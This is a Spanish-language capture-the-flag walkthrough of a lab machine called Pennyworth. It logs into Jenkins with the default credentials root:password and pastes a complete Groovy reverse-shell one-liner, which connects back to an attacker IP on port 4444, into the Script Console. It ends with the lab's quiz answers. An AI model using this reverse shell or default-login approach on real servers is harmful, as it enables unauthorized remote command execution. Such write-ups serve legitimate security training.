# Pennyworth

### 1. 📝 **Introducción**

* **Nivel de Dificultad**: Muy fácil.
* **Tags:**&#x20;
  * **Common Applications (Aplicaciones Comunes):** Son herramientas ampliamente utilizadas en entornos empresariales e industriales, como servidores de integración continua, bases de datos y servicios web. Aunque son esenciales para la productividad, su configuración incorrecta o el uso de versiones desactualizadas pueden exponer vulnerabilidades críticas que los atacantes pueden explotar.
  * **Jenkins:** Es una herramienta de automatización de integración y entrega continua (CI/CD) utilizada para compilar, probar y desplegar aplicaciones. Debido a su uso frecuente en entornos de desarrollo, si no se configura adecuadamente o se protege con credenciales seguras, puede ser un objetivo para ataques como la ejecución remota de código (RCE) o la explotación de credenciales predeterminadas.
  * **Java:** Es un lenguaje de programación versátil y ampliamente utilizado en aplicaciones empresariales y web. Aunque es potente, su ejecución en entornos vulnerables puede llevar a ataques como la deserialización insegura, vulnerabilidades en bibliotecas desactualizadas y explotación de código malicioso dentro de aplicaciones Java en ejecución.
  * **Reconnaissance (Reconocimiento):** Es una fase crítica en las pruebas de penetración donde se recopila información sobre el sistema objetivo. Esto incluye la identificación de versiones de software, credenciales predeterminadas y servicios expuestos, lo que permite a los atacantes descubrir posibles puntos de entrada y debilidades en la infraestructura.
  * **Remote Code Execution (Ejecución Remota de Código - RCE):** Es una de las vulnerabilidades más peligrosas que permite a un atacante ejecutar comandos arbitrarios en un sistema objetivo de forma remota. En entornos con Jenkins y Java, una mala configuración o el uso de plugins inseguros pueden llevar a la explotación de RCE, comprometiendo completamente el servidor.
  * **Default Credentials (Credenciales Predeterminadas):** Son credenciales establecidas por defecto en software o hardware que, si no se cambian, pueden ser utilizadas por atacantes para obtener acceso no autorizado. Servicios como Jenkins a menudo tienen credenciales predeterminadas que, si no son modificadas, pueden permitir compromisos completos del sistema con privilegios administrativos.

### 2. 🛠️ **Entorno**

Nos descargamos nuestra VPN y nos conectamos.

```
sudo openvpn nombre_del_archivo.vpn
```

Iniciamos la máquina y verificamos la conexión.

```bash
ping -c 1 10.129.135.7
```

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Observamos que tenemos conexión y que es una máquina **Linux** ya que su **ttl=63**.

### 3. 🔍 **Reconocimiento**

A continuación, se realiza el comando:

```bash
nmap -sCV -Pn 10.129.135.7
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.&#x20;

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 4. 🚪 **Acceso Inicial**

Como podemos observar durante el escaneo, el puerto **8080** perteneciente al servicio **HTTP** está abierto. A continuación, se indagará más sobre estos servicios.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ponemos las credenciales por defecto **root**:**password**.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos ubicamos en Manage Jenkins > Script Console para subir una Reverse Shell.

```bash
String host="10.10.16.35";int port=4444;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Le damos a run mientras nos ponemos en escucha.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 5. 🔑 **Captura de la Flag**

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 6. ❓Preguntas

**Tarea 1**

**¿Qué significa el acrónimo CVE?**\
📌 **Common Vulnerabilities and Exposures** (Vulnerabilidades y Exposiciones Comunes)

**Tarea 2**

**¿Qué significan las tres letras en CIA, refiriéndose a la tríada CIA en ciberseguridad?**\
📌 **Confidentiality, Integrity, Availability** (Confidencialidad, Integridad, Disponibilidad)

**Tarea 3**

**¿Qué versión del servicio se está ejecutando en el puerto 8080?**\
📌 **Jetty 9.4.39.v20210325**

**Tarea 4**

**¿Qué versión de Jenkins se está ejecutando en el objetivo?**\
📌 **2.289.1**

**Tarea 5**

**¿Qué tipo de script se acepta como entrada en la Consola de Scripts de Jenkins?**\
📌 **Groovy**

**Tarea 6**

**¿A qué sería igual la variable "String cmd" del fragmento de script Groovy si la VM de destino estuviera ejecutando Windows?**\
📌 **cmd.exe**

**Tarea 7**

**¿Qué otro comando, además de "ip a", podríamos usar para mostrar la información de nuestras interfaces de red en Linux?**\
📌 **ifconfig**

**Tarea 8**

**¿Qué opción debemos usar con netcat para que utilice el modo de transporte UDP?**\
📌 **-U**

**Tarea 9**

**¿Cuál es el término utilizado para describir hacer que un host objetivo inicie una conexión de regreso al host del atacante?**\
📌 **reverse shell**
